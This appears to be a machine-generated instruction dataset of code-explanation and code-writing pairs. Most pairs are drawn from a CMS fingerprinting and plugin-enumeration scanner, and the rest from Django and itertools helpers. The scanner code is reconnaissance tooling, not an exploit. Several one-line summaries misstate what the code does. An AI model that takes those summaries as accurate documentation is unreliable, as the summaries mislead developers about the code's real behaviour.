RequestsLogger(self.session)\n        else:\n            if opts['hide_progressbar']:\n                hide_progressbar = True\n            else:\n                hide_progressbar = False\n\n        functionality = self._functionality(opts)\n        enabled_functionality = self._enabled_functionality(functionality, opts)\n\n        return (hide_progressbar, functionality, enabled_functionality)"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef determine_redirect(self, url, host_header, opts):\n        orig_host_header = host_header\n        redir_url = self._determine_redirect(url, opts['verb'],\n                opts['timeout'], self._generate_headers(host_header))\n\n        redirected = redir_url != url\n        if redirected:\n            self.out.echo('[+] Accepted redirect to %s' % redir_url)\n            contains_host = orig_host_header != None\n            if contains_host:\n                parsed = urlparse(redir_url)\n                dns_lookup_required = parsed.netloc != orig_host_header\n                if dns_lookup_required:\n                    url = redir_url\n                    host_header = None\n                else:\n                    orig_parsed = urlparse(url)\n                    parsed = parsed._replace(netloc=orig_parsed.netloc)\n                    url = parsed.geturl()\n\n            else:\n                url = redir_url\n\n        return url, host_header", "response": "Determines whether a redirect is required by the user."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nenumerates available version of CMS at url.", "response": "def enumerate_version(self, url, threads=10, verb='head',\n            timeout=15, hide_progressbar=False, headers={}):\n        \"\"\"\n        Determines which version of CMS is installed at url. This is done by\n        comparing file hashes against the database of hashes in\n        self.version_file, which is located at dscan/plugins/<plugin_name>/versions.xml\n        @param url: the url to check.\n        @param threads: the number of threads to use for this scan.\n        @param verb: HTTP verb to use.\n        @param timeout: time, in seconds, before timing out a request.\n        @param hide_progressbar: should the function hide the progressbar?\n        @param headers: a dict of headers to pass to requests.get.\n        @return (possible_versions, is_empty)\n        \"\"\"\n\n        files = self.vf.files_get()\n        changelogs = self.vf.changelogs_get()\n\n        if not hide_progressbar:\n            p = ProgressBar(sys.stderr, len(files) +\n                    len(changelogs), \"version\")\n\n        hashes = {}\n        futures = {}\n        with ThreadPoolExecutor(max_workers=threads) as executor:\n            for file_url in files:\n                futures[file_url] = executor.submit(self.enumerate_file_hash,\n                        url, file_url=file_url, timeout=timeout, headers=headers)\n\n            for file_url in futures:\n                if common.shutdown:\n                    futures[file_url].cancel()\n                    continue\n\n                try:\n                    hsh = futures[file_url].result()\n                    hashes[file_url] = hsh\n                except RuntimeError:\n                    pass\n\n                if not hide_progressbar:\n                    p.increment_progress()\n\n        version = self.vf.version_get(hashes)\n\n        # Narrow down using changelog, if accurate.\n        if self.vf.has_changelog():\n            version = self.enumerate_version_changelog(url, version, timeout, headers=headers)\n\n        if not hide_progressbar:\n            p.increment_progress()\n            p.hide()\n\n        return version, len(version) == 0"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nenumerating the changelog versions for a given URL.", "response": "def enumerate_version_changelog(self, url, versions_estimated, timeout=15,\n            headers={}):\n        \"\"\"\n        If we have a changelog in store for this CMS, this function will be\n        called, and a changelog will be used for narrowing down which version is\n        installed. If the changelog's version is outside our estimated range,\n        it is discarded.\n        @param url: the url to check against.\n        @param versions_estimated: the version other checks estimate the\n            installation is.\n        @param timeout: the number of seconds to wait before expiring a request.\n        @param headers: headers to pass to requests.get()\n        \"\"\"\n        changelogs = self.vf.changelogs_get()\n        ch_hash = None\n        for ch_url in changelogs:\n            try:\n                ch_hash = self.enumerate_file_hash(url, file_url=ch_url,\n                        timeout=timeout, headers=headers)\n            except RuntimeError:\n                pass\n\n        ch_version = self.vf.changelog_identify(ch_hash)\n        if ch_version in versions_estimated:\n            return [ch_version]\n        else:\n            return versions_estimated"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef enumerate_file_hash(self, url, file_url, timeout=15, headers={}):\n        r = self.session.get(url + file_url, timeout=timeout, headers=headers)\n        if r.status_code == 200:\n            hash = hashlib.md5(r.content).hexdigest()\n            return hash\n        else:\n            raise RuntimeError(\"File '%s' returned status code '%s'.\" % (file_url, r.status_code))", "response": "Get the MD5 of a file."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _enumerate_plugin_if(self, found_list, verb, threads, imu_list,\n            hide_progressbar, timeout=15, headers={}):\n        \"\"\"\n        Finds interesting urls within a plugin folder which respond with 200 OK.\n        @param found_list: as returned in self.enumerate. E.g. [{'name':\n            'this_exists', 'url': 'http://adhwuiaihduhaknbacnckajcwnncwkakncw.com/sites/all/modules/this_exists/'}]\n        @param verb: the verb to use.\n        @param threads: the number of threads to use.\n        @param imu_list: Interesting module urls.\n        @param hide_progressbar: whether to display a progressbar.\n        @param timeout: timeout in seconds for http requests.\n        @param headers: custom headers as expected by requests.\n        \"\"\"\n\n        if not hide_progressbar:\n            p = ProgressBar(sys.stderr, len(found_list) *\n                    len(imu_list), name=\"IMU\")\n\n        requests_verb = getattr(self.session, verb)\n        with ThreadPoolExecutor(max_workers=threads) as executor:\n            futures = []\n            for i, found in enumerate(found_list):\n                found_list[i]['imu'] = []\n                for imu in imu_list:\n                    interesting_url = found['url'] + imu[0]\n                    future = executor.submit(requests_verb, interesting_url,\n                            timeout=timeout, headers=headers)\n\n                    futures.append({\n                        'url': interesting_url,\n                        'future': future,\n                        'description': imu[1],\n                        'i': i\n                    })\n\n            for f in futures:\n                if common.shutdown:\n                    f['future'].cancel()\n                    continue\n\n                r = f['future'].result()\n                if r.status_code == 200:\n                    found_list[f['i']]['imu'].append({\n                        'url': f['url'],\n                        'description': f['description']\n                    })\n\n                if not hide_progressbar:\n                    p.increment_progress()\n\n        if not hide_progressbar:\n            p.hide()\n\n        return found_list", "response": "Enumerate all interesting urls within a plugin folder."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef cms_identify(self, url, timeout=15, headers={}):\n        self.out.debug(\"cms_identify\")\n        if isinstance(self.regular_file_url, str):\n            rfu = [self.regular_file_url]\n        else:\n            rfu = self.regular_file_url\n\n        is_cms = False\n        for regular_file_url in rfu:\n            try:\n                hash = self.enumerate_file_hash(url, regular_file_url, timeout,\n                        headers)\n            except RuntimeError:\n                continue\n\n            hash_exists = self.vf.has_hash(hash)\n            if hash_exists:\n                is_cms = True\n                break\n\n        return is_cms", "response": "Function called when attempting to determine if a URL is identified as being this particular CMS."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nforward fh n lines to resume the previous scan.", "response": "def resume_forward(self, fh, resume, file_location, error_log):\n        \"\"\"\n        Forwards `fh` n lines, where n lines is the amount of lines we should\n        skip in order to resume our previous scan, if resume is required by the\n        user.\n        @param fh: fh to advance.\n        @param file_location: location of the file handler in disk.\n        @param error_log: location of the error_log in disk.\n        \"\"\"\n        if resume:\n            if not error_log:\n                raise CannotResumeException(\"--error-log not provided.\")\n\n            skip_lines = self.resume(file_location, error_log)\n            for _ in range(skip_lines):\n                next(fh)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nprinting out the result of the scan.", "response": "def result(self, result, functionality):\n        \"\"\"\n        For the final result of the scan.\n        @param result: as returned by BasePluginInternal.url_scan\n        @param functionality: functionality as returned by\n            BasePluginInternal._general_init\n        \"\"\"\n        for enumerate in result:\n\n            # The host is a special header, we must not attempt to display it.\n            if enumerate == \"host\" or enumerate == \"cms_name\":\n                continue\n\n            result_ind = result[enumerate]\n            finds = result_ind['finds']\n            is_empty = result_ind['is_empty']\n\n            template_str = functionality[enumerate]['template']\n            template_params = {\n                    'noun': enumerate,\n                    'Noun': enumerate.capitalize(),\n                    'items': finds,\n                    'empty': is_empty,\n                }\n\n            self.echo(template(template_str, template_params))"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef warn(self, msg, whitespace_strp=True):\n        if self.errors_display:\n            if whitespace_strp:\n                msg = strip_whitespace(msg)\n\n            if not self.log_to_file:\n                msg = colors['warn'] + \"[+] \" + msg + colors['endc']\n            else:\n                msg = \"[\" + time.strftime(\"%c\") + \"] \" + msg\n\n            self.print(msg, file=self.error_log)", "response": "Print a warning message to stderr."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef fatal(self, msg):\n        if not self.log_to_file:\n            msg = strip_whitespace(colors['red'] + \"[+] \" + msg +\n                    colors['endc'])\n        else:\n            msg = \"[\" + time.strftime(\"%c\") + \"] \" + msg\n\n        raise RuntimeError(msg)", "response": "Raise a RuntimeError if the program cannot continue."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nprint out the response to stdout.", "response": "def _print(self, method, *args, **kwargs):\n        \"\"\"\n        Output format affects integration tests.\n        @see: IntegrationTests.mock_output\n        \"\"\"\n        sess_method = getattr(self._session, method)\n\n        try:\n            headers = kwargs['headers']\n        except KeyError:\n            headers = {}\n\n        tpl = '[%s] %s %s'\n        print(tpl % (method, args[0], headers), end=' ')\n\n        try:\n            r = sess_method(*args, **kwargs)\n        except:\n            e = sys.exc_info()\n            e_str = \"%s: %s\" % (e[0], e[1])\n            print(\"FAILED (%s)\" % e_str)\n            raise\n\n        if method == \"get\" and r.status_code == 200:\n            hsh = hashlib.md5(r.content).hexdigest()\n        else:\n            hsh = \"\"\n\n        print(r.status_code, hsh)\n\n        return r"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef repair_url(url):\n    url = url.strip('\\n')\n    if not re.match(r\"^http\", url):\n        url = \"http://\" + url\n\n    if \"?\" in url:\n        url, _ = url.split('?')\n\n    if not url.endswith(\"/\"):\n        return url + \"/\"\n    else :\n        return url", "response": "Fixes URL.\n    @param url: url to repair.\n    @param out: instance of StandardOutput as defined in this lib.\n    @return: Newline characters are stripped from the URL string.\n        If the url string parameter does not start with http, it prepends http://\n        If the url string parameter does not end with a slash, appends a slash.\n        If the url contains a query string, it gets removed."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ncoding for parsing simple, numeric versions. Letters will be stripped prior to comparison. Simple appendages such as 1-rc1 are supported. Test cases for function are present on dscan/tests/fingerprint_tests.py", "response": "def version_gt(version, gt):\n    \"\"\"\n    Code for parsing simple, numeric versions. Letters will be stripped prior to\n    comparison. Simple appendages such as 1-rc1 are supported. Test cases for\n    function are present on dscan/tests/fingerprint_tests.py\n    \"\"\"\n    version_split = strip_letters(version).split('.')\n    gt_split = strip_letters(gt).split('.')\n\n    v_len = len(version_split)\n    g_len = len(gt_split)\n    if v_len > g_len:\n        longest = version_split\n        shortest_len = len(gt_split)\n        l = v_len\n    else:\n        longest = gt_split\n        shortest_len = len(version_split)\n        l = g_len\n\n    gt = False\n    for i in range(l):\n        overcame_shortest = i >= shortest_len\n\n        if not overcame_shortest:\n\n            v = version_split[i]\n            g = gt_split[i]\n\n            v_is_rc = '-' in v or '_' in v\n            g_is_rc = '-' in g or '_' in g\n\n            if v_is_rc:\n                v_split = re.split(r'[-_]', v)\n                v = v_split[0]\n                try:\n                    v_rc_nb = int(''.join(v_split[1:]))\n                except ValueError:\n                    v_rc_nb = 0\n\n            if g_is_rc:\n                g_split = re.split(r'[-_]', g)\n                g = g_split[0]\n                try:\n                    g_rc_nb = int(''.join(g_split[1:]))\n                except ValueError:\n                    g_rc_nb = 0\n\n            try:\n                v = int(v)\n            except ValueError:\n                v = 0\n\n            try:\n                g = int(g)\n            except ValueError:\n                g = 0\n\n            if v > g:\n                gt = True\n                break\n            elif v < g:\n                break\n            else:\n                if not v_is_rc and g_is_rc:\n                    gt = True\n                    break\n                elif v_is_rc and not g_is_rc:\n                    break\n                elif v_is_rc and g_is_rc:\n                    if v_rc_nb > g_rc_nb:\n                        gt = True\n                        break\n                    elif v_rc_nb < g_rc_nb:\n                        break\n\n        else:\n            nb = longest[i]\n\n            is_rc = '-' in nb or '_' in nb\n            if is_rc:\n                nb = re.split(r'[-_]', nb)[0]\n\n            try:\n                nb_int = int(nb)\n            except ValueError:\n                if longest == version_split:\n                    break\n                else:\n                    gt = True\n                    break\n\n            if nb_int > 0:\n                if longest == version_split:\n                    gt = True\n                    break\n                else:\n                    break\n\n    return gt"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef exc_handle(url, out, testing):\n    quiet_exceptions = [ConnectionError, ReadTimeout, ConnectTimeout,\n            TooManyRedirects]\n    type, value, _ = sys.exc_info()\n    if type not in quiet_exceptions or testing:\n        exc = traceback.format_exc()\n        exc_string = (\"Line '%s' raised:\\n\" % url) + exc\n        out.warn(exc_string, whitespace_strp=False)\n\n        if testing:\n            print(exc)\n    else:\n        exc_string = \"Line %s '%s: %s'\" % (url, type, value)\n        out.warn(exc_string)", "response": "Handle exception raised by the log file."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef tail(f, window=20):\n    if window == 0:\n        return []\n    BUFSIZ = 1024\n    f.seek(0, 2)\n    bytes = f.tell()\n    size = window + 1\n    block = -1\n    data = []\n    while size > 0 and bytes > 0:\n        if bytes - BUFSIZ > 0:\n            # Seek back one whole BUFSIZ\n            f.seek(block * BUFSIZ, 2)\n            # read BUFFER\n            data.insert(0, f.read(BUFSIZ).decode('utf-8', errors='ignore'))\n        else:\n            # file too small, start from begining\n            f.seek(0,0)\n            # only read what was not read\n            data.insert(0, f.read(bytes).decode('utf-8', errors='ignore'))\n\n        linesFound = data[0].count('\\n')\n        size -= linesFound\n        bytes -= BUFSIZ\n        block -= 1\n    return ''.join(data).splitlines()[-window:]", "response": "Returns the last window lines of file f as a list."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nprocessing a line and determines whether it is a tab - delimited CSV of url and host.", "response": "def process_host_line(line):\n    \"\"\"\n    Processes a line and determines whether it is a tab-delimited CSV of\n    url and host.\n\n    Strips all strings.\n\n    @param line: the line to analyse.\n    @param opts: the options dictionary to modify.\n    @return: a tuple containing url, and host header if any change is\n        required. Otherwise, line, null is returned.\n    \"\"\"\n    if not line:\n        return None, None\n\n    host = None\n    if _line_contains_host(line):\n        url, host = re.split(SPLIT_PATTERN, line.strip())\n    else:\n        url = line.strip()\n\n    return url, host"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ncreating and returns a dictionary containing instances for all available available scanning plugins sort of ordered by popularity.", "response": "def instances_get(opts, plugins, url_file_input, out):\n    \"\"\"\n    Creates and returns an ordered dictionary containing instances for all available\n    scanning plugins, sort of ordered by popularity.\n    @param opts: options as returned by self._options.\n    @param plugins: plugins as returned by plugins_util.plugins_base_get.\n    @param url_file_input: boolean value which indicates whether we are\n        scanning an individual URL or a file. This is used to determine\n        kwargs required.\n    @param out: self.out\n    \"\"\"\n    instances = OrderedDict()\n    preferred_order = ['wordpress', 'joomla', 'drupal']\n\n    for cms_name in preferred_order:\n        for plugin in plugins:\n            plugin_name = plugin.__name__.lower()\n\n            if cms_name == plugin_name:\n                instances[plugin_name] = instance_get(plugin, opts,\n                        url_file_input, out)\n\n    for plugin in plugins:\n        plugin_name = plugin.__name__.lower()\n        if plugin_name not in preferred_order:\n            instances[plugin_name] = instance_get(plugin, opts,\n                    url_file_input, out)\n\n    return instances"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nreturn an instance dictionary for an individual plugin.", "response": "def instance_get(plugin, opts, url_file_input, out):\n    \"\"\"\n    Return an instance dictionary for an individual plugin.\n    @see Scan._instances_get.\n    \"\"\"\n    inst = plugin()\n    hp, func, enabled_func = inst._general_init(opts, out)\n    name = inst._meta.label\n\n    kwargs = {\n        'hide_progressbar': hp,\n        'functionality': func,\n        'enabled_functionality': enabled_func\n    }\n\n    if url_file_input:\n        del kwargs['hide_progressbar']\n\n    return {\n        'inst': inst,\n        'kwargs': kwargs\n    }"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef result_anything_found(result):\n    keys = ['version', 'themes', 'plugins', 'interesting urls']\n    anything_found = False\n    for k in keys:\n        if k not in result:\n            continue\n        else:\n            if not result[k]['is_empty']:\n                anything_found = True\n\n    return anything_found", "response": "Return whether any of the items in the result dictionary is a valid scanning method."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nupdates self. et with the sums as returned by VersionsX. sums_get", "response": "def update(self, sums):\n        \"\"\"\n        Update self.et with the sums as returned by VersionsX.sums_get\n        @param sums: {'version': {'file1':'hash1'}}\n        \"\"\"\n        for version in sums:\n            hashes = sums[version]\n            for filename in hashes:\n                hsh = hashes[filename]\n                file_xpath = './files/*[@url=\"%s\"]' % filename\n                try:\n                    file_add = self.root.findall(file_xpath)[0]\n                except IndexError:\n                    raise ValueError(\"Attempted to update element '%s' which doesn't exist\" % filename)\n\n                # Do not add duplicate, equal hashes.\n                if not self.version_exists(file_add, version, hsh):\n                    new_ver = ET.SubElement(file_add, 'version')\n                    new_ver.attrib = {\n                            'md5': hsh,\n                            'nb': version\n                    }"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nget new tags from a github repository.", "response": "def github_tags_newer(github_repo, versions_file, update_majors):\n    \"\"\"\n    Get new tags from a github repository. Cannot use github API because it\n    doesn't support chronological ordering of tags.\n    @param github_repo: the github repository, e.g. 'drupal/drupal/'.\n    @param versions_file: the file path where the versions database can be found.\n    @param update_majors: major versions to update. If you want to update\n        the 6.x and 7.x branch, you would supply a list which would look like\n        ['6', '7']\n    @return: a boolean value indicating whether an update is needed\n    @raise MissingMajorException: A new version from a newer major branch is\n        exists, but will not be downloaded due to it not being in majors.\n    \"\"\"\n    github_repo = _github_normalize(github_repo)\n    vf = VersionsFile(versions_file)\n    current_highest = vf.highest_version_major(update_majors)\n\n    tags_url = '%s%stags' % (GH, github_repo)\n    resp = requests.get(tags_url)\n    bs = BeautifulSoup(resp.text, 'lxml')\n\n    gh_versions = []\n    for header in bs.find_all('h4'):\n        tag = header.findChild('a')\n        if not tag:\n            continue # Ignore learn more header.\n        gh_versions.append(tag.text.strip())\n\n    newer = _newer_tags_get(current_highest, gh_versions)\n\n    return len(newer) > 0"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _check_newer_major(current_highest, versions):\n    for tag in versions:\n        update_majors = list(current_highest.keys())\n        example_version_str = current_highest[update_majors[0]]\n        if _tag_is_rubbish(tag, example_version_str):\n            continue\n\n        major = tag[0:len(update_majors[0])]\n        if major not in current_highest:\n            higher_version_present = False\n            for major_highest in current_highest:\n                if version_gt(major_highest, major):\n                    higher_version_present = True\n                    break\n\n            if not higher_version_present:\n                msg = 'Failed updating: Major %s has a new version and is not going to be updated.' % major\n                raise MissingMajorException(msg)", "response": "Utility function for checking whether a new version exists and is not going to be updated."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nreturn versions from versions which are greater than the highest version in each major.", "response": "def _newer_tags_get(current_highest, versions):\n    \"\"\"\n    Returns versions from versions which are greater than than the highest\n    version in each major. If a newer major is present in versions which is\n    not present on current_highest, an exception will be raised.\n    @param current_highest: as returned by VersionsFile.highest_version_major()\n    @param versions: a list of versions.\n    @return: a list of versions.\n    @raise MissingMajorException: A new version from a newer major branch is\n        exists, but will not be downloaded due to it not being in majors.\n    \"\"\"\n    newer = []\n    for major in current_highest:\n        highest_version = current_highest[major]\n        for version in versions:\n            version = version.lstrip('v')\n            if version.startswith(major) and version_gt(version,\n                    highest_version):\n                newer.append(version)\n\n    _check_newer_major(current_highest, versions)\n\n    return newer"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef github_repo(github_repo, plugin_name):\n    github_repo = _github_normalize(github_repo)\n    repo_url = '%s%s' % (GH, github_repo)\n\n    gr = GitRepo(repo_url, plugin_name)\n    gr.init()\n\n    return gr", "response": "Returns a GitRepo from a github repository."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef github_repo_new(repo_url, plugin_name, versions_file, update_majors):\n    gr = github_repo(repo_url, plugin_name)\n    vf = v.VersionsFile(versions_file)\n    new_tags = gr.tags_newer(vf, update_majors)\n\n    return gr, vf, new_tags", "response": "Convenience method which creates a new GitRepo and returns a VersionsFile and tags which need to be updated."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef hashes_get(versions_file, base_path):\n    files = versions_file.files_get_all()\n    result = {}\n    for f in files:\n        try:\n            result[f] = functions.md5_file(base_path + f)\n        except IOError:\n            # Not all files exist for all versions.\n            pass\n\n    return result", "response": "Gets hashes for currently checked out version."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef file_mtime(file_path):\n    if not os.path.isfile(file_path):\n        raise IOError('File \"%s\" does not exist.' % file_path)\n\n    ut = subprocess.check_output(['git', 'log', '-1', '--format=%ct',\n        file_path]).strip()\n\n    return datetime.fromtimestamp(int(ut))", "response": "Returns the file modification time in the current git repository."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef modules_get(url_tpl, per_page, css, max_modules=2000, pagination_type=PT.normal):\n    page = 0\n    elements = False\n    done_so_far = 0\n\n    max_potential_pages = max_modules / per_page\n    print(\"Maximum pages: %s.\" % max_potential_pages)\n\n    stop = False\n    while elements == False or len(elements) == per_page:\n        url = url_tpl % page\n\n        r = requests.get(url)\n        bs = BeautifulSoup(r.text, 'lxml')\n        elements = bs.select(css)\n\n        for element in elements:\n            yield element\n            done_so_far += 1\n\n            if done_so_far >= max_modules:\n                stop = True\n                break\n\n        if stop:\n            break\n\n        if pagination_type == PT.normal:\n            print('Finished parsing page %s.' % page)\n            page += 1\n        elif pagination_type == PT.skip:\n            print('Finished parsing page %s.' % (page / per_page))\n            page += per_page\n        else:\n            assert False", "response": "Get a list of modules."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef multipart_parse_json(api_url, data):\n    headers = {'Content-Type': 'application/x-www-form-urlencoded'}\n    response_text = requests.post(api_url, data=data, headers=headers)\\\n        .text.encode('ascii', errors='replace')\n\n    return json.loads(response_text.decode())", "response": "Send a post request and parse the JSON response."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef init(self):\n        if os.path.isdir(self.path):\n            self.fetch()\n        else:\n            self.clone()", "response": "Initializes the object based on whether the repository has been previously cloned or not."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ncloning a directory based on the clone_url and plugin_name given to the constructor.", "response": "def clone(self):\n        \"\"\"\n        Clones a directory based on the clone_url and plugin_name given to the\n        constructor. The clone will be located at self.path.\n        \"\"\"\n        base_dir = '/'.join(self.path.split('/')[:-2])\n        try:\n            os.makedirs(base_dir, 0o700)\n        except OSError:\n            # Raises an error exception if the leaf directory already exists.\n            pass\n\n        self._cmd(['git', 'clone', self._clone_url, self.path], cwd=os.getcwd())"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef tags_newer(self, versions_file, majors):\n        highest = versions_file.highest_version_major(majors)\n        all = self.tags_get()\n\n        newer = _newer_tags_get(highest, all)\n\n        if len(newer) == 0:\n            raise RuntimeError(\"No new tags found.\")\n\n        return newer", "response": "Checks this git repo tags for newer versions."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nreturn a list of al regular file urls for all plugins.", "response": "def get_rfu():\n    \"\"\"\n    Returns a list of al \"regular file urls\" for all plugins.\n    \"\"\"\n    global _rfu\n    if _rfu:\n        return _rfu\n\n    plugins = plugins_base_get()\n    rfu = []\n    for plugin in plugins:\n        if isinstance(plugin.regular_file_url, str):\n            rfu.append(plugin.regular_file_url)\n        else:\n            rfu += plugin.regular_file_url\n\n    _rfu = rfu\n\n    return rfu"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef plugin_get_rfu(plugin):\n    if isinstance(plugin.regular_file_url, str):\n        rfu = [plugin.regular_file_url]\n    else:\n        rfu = plugin.regular_file_url\n\n    return rfu", "response": "Returns the list of regular file urls for a particular plugin."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef plugin_get(name):\n    plugins = plugins_base_get()\n    for plugin in plugins:\n        if plugin.Meta.label == name:\n            return plugin\n\n    raise RuntimeError('CMS \"%s\" not known.' % name)", "response": "Get the object from the plugin list."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef get_prep_value(self, value):\n        if value:\n            if not isinstance(value, PhoneNumber):\n                value = to_python(value)\n            if value.is_valid():\n                format_string = getattr(settings, \"PHONENUMBER_DB_FORMAT\", \"E164\")\n                fmt = PhoneNumber.format_map[format_string]\n                value = value.format_as(fmt)\n            else:\n                value = self.get_default()\n        return super(PhoneNumberField, self).get_prep_value(value)", "response": "Perform preliminary non - db specific value checks and conversions."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef first(iterable, default=_marker):\n    try:\n        return next(iter(iterable))\n    except StopIteration:\n        # I'm on the edge about raising ValueError instead of StopIteration. At\n        # the moment, ValueError wins, because the caller could conceivably\n        # want to do something different with flow control when I raise the\n        # exception, and it's weird to explicitly catch StopIteration.\n        if default is _marker:\n            raise ValueError('first() was called on an empty iterable, and no '\n                             'default value was provided.')\n        return default", "response": "Return the first item of the iterable or default if none is provided."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef last(iterable, default=_marker):\n    try:\n        try:\n            # Try to access the last item directly\n            return iterable[-1]\n        except (TypeError, AttributeError, KeyError):\n            # If not slice-able, iterate entirely using length-1 deque\n            return deque(iterable, maxlen=1)[0]\n    except IndexError:  # If the iterable was empty\n        if default is _marker:\n            raise ValueError('last() was called on an empty iterable, and no '\n                             'default value was provided.')\n        return default", "response": "Return the last item of an iterable or default if none is provided."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _collate(*iterables, key=lambda a: a, reverse=False):\n    min_or_max = partial(max if reverse else min, key=itemgetter(0))\n    peekables = [peekable(it) for it in iterables]\n    peekables = [p for p in peekables if p]  # Kill empties.\n    while peekables:\n        _, p = min_or_max((key(p.peek()), p) for p in peekables)\n        yield next(p)\n        peekables = [x for x in peekables if x]", "response": "Yields the elements of iterables in order."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef ilen(iterable):\n    # This approach was selected because benchmarks showed it's likely the\n    # fastest of the known implementations at the time of writing.\n    # See GitHub tracker: #236, #230.\n    counter = count()\n    deque(zip(iterable, counter), maxlen=0)\n    return next(counter)", "response": "Return the number of items in iterable."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef one(iterable, too_short=None, too_long=None):\n    it = iter(iterable)\n\n    try:\n        value = next(it)\n    except StopIteration:\n        raise too_short or ValueError('too few items in iterable (expected 1)')\n\n    try:\n        next(it)\n    except StopIteration:\n        pass\n    else:\n        raise too_long or ValueError('too many items in iterable (expected 1)')\n\n    return value", "response": "Return the first item from an iterable which is expected to contain only\n    that item. Raise an exception if the iterable is empty or contains more than one item."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef distinct_permutations(iterable):\n    def make_new_permutations(permutations, e):\n        \"\"\"Internal helper function.\n        The output permutations are built up by adding element *e* to the\n        current *permutations* at every possible position.\n        The key idea is to keep repeated elements (reverse) ordered:\n        if e1 == e2 and e1 is before e2 in the iterable, then all permutations\n        with e1 before e2 are ignored.\n\n        \"\"\"\n        for permutation in permutations:\n            for j in range(len(permutation)):\n                yield permutation[:j] + [e] + permutation[j:]\n                if permutation[j] == e:\n                    break\n            else:\n                yield permutation + [e]\n\n    permutations = [[]]\n    for e in iterable:\n        permutations = make_new_permutations(permutations, e)\n\n    return (tuple(t) for t in permutations)", "response": "Yields successive distinct permutations of the elements in iterable."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef intersperse(e, iterable, n=1):\n    if n == 0:\n        raise ValueError('n must be > 0')\n    elif n == 1:\n        # interleave(repeat(e), iterable) -> e, x_0, e, e, x_1, e, x_2...\n        # islice(..., 1, None) -> x_0, e, e, x_1, e, x_2...\n        return islice(interleave(repeat(e), iterable), 1, None)\n    else:\n        # interleave(filler, chunks) -> [e], [x_0, x_1], [e], [x_2, x_3]...\n        # islice(..., 1, None) -> [x_0, x_1], [e], [x_2, x_3]...\n        # flatten(...) -> x_0, x_1, e, x_2, x_3...\n        filler = repeat([e])\n        chunks = chunked(iterable, n)\n        return flatten(islice(interleave(filler, chunks), 1, None))", "response": "Intersperse an element into a new tree structure."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nreturn the elements from each of the input iterables that aren t in the other iterables.", "response": "def unique_to_each(*iterables):\n    \"\"\"Return the elements from each of the input iterables that aren't in the\n    other input iterables.\n\n    For example, suppose you have a set of packages, each with a set of\n    dependencies::\n\n        {'pkg_1': {'A', 'B'}, 'pkg_2': {'B', 'C'}, 'pkg_3': {'B', 'D'}}\n\n    If you remove one package, which dependencies can also be removed?\n\n    If ``pkg_1`` is removed, then ``A`` is no longer necessary - it is not\n    associated with ``pkg_2`` or ``pkg_3``. Similarly, ``C`` is only needed for\n    ``pkg_2``, and ``D`` is only needed for ``pkg_3``::\n\n        >>> unique_to_each({'A', 'B'}, {'B', 'C'}, {'B', 'D'})\n        [['A'], ['C'], ['D']]\n\n    If there are duplicates in one input iterable that aren't in the others\n    they will be duplicated in the output. Input order is preserved::\n\n        >>> unique_to_each(\"mississippi\", \"missouri\")\n        [['p', 'p'], ['o', 'u', 'r']]\n\n    It is assumed that the elements of each iterable are hashable.\n\n    \"\"\"\n    pool = [list(it) for it in iterables]\n    counts = Counter(chain.from_iterable(map(set, pool)))\n    uniques = {element for element in counts if counts[element] == 1}\n    return [list(filter(uniques.__contains__, it)) for it in pool]"}
